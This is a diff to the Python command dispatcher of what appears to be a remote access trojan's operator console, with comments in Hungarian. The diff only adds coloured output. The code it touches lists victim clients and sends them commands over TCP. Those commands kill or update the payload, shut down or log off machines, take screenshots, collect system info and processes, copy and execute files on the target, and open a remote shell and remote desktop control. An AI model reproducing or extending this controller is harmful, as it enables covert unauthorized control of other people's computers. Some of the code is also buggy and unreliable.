@@ -9,12 +9,14 @@ import negnox
 import TCPHelper
 import Components
 
-helpuzenet = '''//célpontok
+C = Components.C
+
+helpuzenet = f'''{C("green")}//célpontok{C("yellow")}
 target       - beállítja a célpontot
 rtarget      - vissza állítja hogy ne legyen célpont
 settarget    - grafikus felületű célpont beállítás
 lsc          - kilistázza a klienseket
-//parancsok amik nem küldenek vissza semmit
+{C("green")}//parancsok amik nem küldenek vissza semmit{C("yellow")}
 setwallpaper - beállít egy hátteret ("")
 kys          - le killeli a futó payloadot
 update       - le frissíti a futó payloadot
@@ -29,7 +31,7 @@ logoff       - kijelentkezteti a felhasználót
 shutdown     - lekapcsolja a gépet
 restart      - újraindítja a gépet
 audio [100]  - beállítja a hangerőt (itt pl 100-ra)
-//lokális parancsok
+{C("green")}//lokális parancsok{C("yellow")}
 cdme         - könyvtárat vált ("")
 lsme         - ki listázza a könyvtár tartalmát
 exet         - átmásol, majd el is indít egy fájlt ("")
@@ -39,7 +41,7 @@ help         - kiírja ezt az üzenetet
 pwdme        - kijelzi hogy mi a jelenlegi lokális könyvtár
 copy         - átmásol fájlokat a CÉLPONT gépére ("" "")     
 reload       - újra indítja a listenert
-//amik vissza is adnak valamit
+{C("green")}//amik vissza is adnak valamit{C("yellow")}
 cd           - könyvtár változtatás a célpont gépén          [$célpont specifikus!$]
 ls           - könyvtár kilistázása a célpont gépén          [$célpont specifikus!$]
 pwd          - jelenlegi tartózkodási helye a payloadnak     [$célpont specifikus!$]
@@ -49,13 +51,14 @@ fsi          - fetch system info                             [$célpont specifik
 frp          - fetch running processes                       [$célpont specifikus!$]
 fsc          - fetch screens                                 [$célpont specifikus!$]
 screenshot   - csinál egy képernyőképet                      [$célpont specifikus!$]
-//beépített programok
+{C("green")}//beépített programok{C("yellow")}
 rShello      - távolról vezérelhető cmd-t nyit               [$célpont specifikus!$]
              - először telepítés : exet "rSL.exe"
 mouseC       - távolról vezérelhető desktop applikáció       [$célpont specifikus!$]
              - először telepítés : exet "MCL.exe"'''
 
 def CheckCommand(x):
+    
     xSplittelve = x.split(" ")
     bemenet = Components.parancsDarabolas(x)
     bemenetek = Components.parameterDarabolas(x)
@@ -65,19 +68,19 @@ def CheckCommand(x):
     command = xSplittelve[0]
 
     if command == "help":
-        print(helpuzenet)
+        print(f"{C("yellow")}{helpuzenet}\x1b[0m")
     elif command == "":
         print("", end='')
     elif command == "target":
         if len(xSplittelve) == 1:
-            print(f"Célpont : {negnox.Program.targetIp}")
+            print(f"Célpont : {C("cyan")}{negnox.Program.targetIp}{C("")}")
         else :
             negnox.Program.targetIp = xSplittelve[1]
             negnox.Program.vanTarget == True
-            print(f"{negnox.Program.targetIp} sikeresen beállítva új célpontnak")
+            print(f"{C("cyan")}{negnox.Program.targetIp}{C("")} sikeresen beállítva új célpontnak")
     elif command == "rtarget":
         negnox.Program.targetIp = ""
-        print("Célpont tisztára frissítve!")
+        print(f"{C("green")}Célpont tisztára frissítve!{C("")}")
     elif command == "setwallpaper" :
         TCPHelper.TCPHelper.Send("setwallpaper")
         TCPHelper.TCPHelper.Send(bemenetek[1])
@@ -85,7 +88,7 @@ def CheckCommand(x):
         TCPHelper.TCPHelper.Send("msgbox")
         TCPHelper.TCPHelper.Send(bemenet)
     elif command == "kys":
-        print("Biztos hogy meg akarod tenni? (y/n)")
+        print(f"{C("magenta")}Biztos hogy meg akarod tenni? (y/n){C("")}")
         valasz = input()
         if valasz == "y":
             TCPHelper.TCPHelper.Send("kys")
@@ -104,7 +107,7 @@ def CheckCommand(x):
             print("csatlakozott kliensek:")
             print("----------------------")
             for c in negnox.Program.kliensek:
-                print(f"[{c.getpeername()[0]}]")
+                print(f"[{C("green")}{c.getpeername()[0]}{C("")}]")
             print("----------------------")
     elif command == "mousex":
         TCPHelper.TCPHelper.Send("mousex")
@@ -117,7 +120,7 @@ def CheckCommand(x):
         TCPHelper.TCPHelper.Send(bemenet)
     elif command == "kill":
         if (not bemenet.startswith("\"")) or ("\"" not in bemenet):
-            print("Nem helyes a szintaxis!")
+            print(f"{C("red")}Nem helyes a szintaxis!{C("")}")
         else :
             TCPHelper.TCPHelper.Send("kill")
             TCPHelper.TCPHelper.Send(bemenetek[1])
@@ -137,7 +140,7 @@ def CheckCommand(x):
         TCPHelper.TCPHelper.Send("restart")
         TCPHelper.TCPHelper.Send("-")        
     elif command == "reload":
-        print("[ez itt pythonba bizonyos okok miatt nem működik]")
+        print(f"[{C("red")}ez itt pythonba bizonyos okok miatt nem működik{C("")}]")
     elif command == "cd":
         if Components.CheckTargetEnabled():
             TCPHelper.TCPHelper.Send("cd")
@@ -160,7 +163,7 @@ def CheckCommand(x):
             TCPHelper.TCPHelper.Send(bemenet)
     #sajatok
     elif command == "pwdme":
-        print(f"{os.getcwd()}")
+        print(f"{C("blue")}{os.getcwd()}{C("")}")
     elif command == "cdme":
         if xSplittelve[1] == ".." :
             os.chdir(os.path.dirname(os.getcwd()))
@@ -174,7 +177,7 @@ def CheckCommand(x):
             if os.path.isdir(ahova) :
                 os.chdir(ahova)
             else:
-                print("[Nincs ilyen könyvtár ahova lehetne menni]")
+                print(f"[{C("red")}Nincs ilyen könyvtár ahova lehetne menni{C("")}]")
     elif command == "cdme..":
         os.chdir(os.path.dirname(os.getcwd()))
     elif command == "lsme":
@@ -191,9 +194,9 @@ def CheckCommand(x):
 
 
             if is_dir:
-                print("[MAPPA] > ", end="")
+                print(f"{C("cyan")}[MAPPA]{C("")} > ", end="")
             else:
-                print("[FÁJL]  > ", end="")
+                print(f"{C("green")}[FÁJL]{C("")}  > ", end="")
             # fájlnév kiírás
             print(name, end="")
 
@@ -209,12 +212,12 @@ def CheckCommand(x):
     #bolond falj muveletek
     elif command == "copy":
         if (not bemenet.startswith("\"")) or ("\"" not in bemenet):
-            print("[Nem helyes a szintaxis! (hiányzik \")]")
+            print(f"[{C("red")}Nem helyes a szintaxis! (hiányzik \"){C("")}]")
         else :
             filePath = bemenetek[1]
             filePath.replace("/", "\\")
             if os.path.isfile(filePath):
-                print("[A megadott fájl nem létezik!]")
+                print(f"[{C("red")}A megadott fájl nem létezik!{C("")}]")
             for item in bemenetek :
                 print(item)
             print(len(item))
@@ -265,5 +268,5 @@ def CheckCommand(x):
     
     
     else:
-        print("ismeretlen parancs!")   
+        print(f"[{C("red")}ismeretlen parancs!{C("")}]")   
 
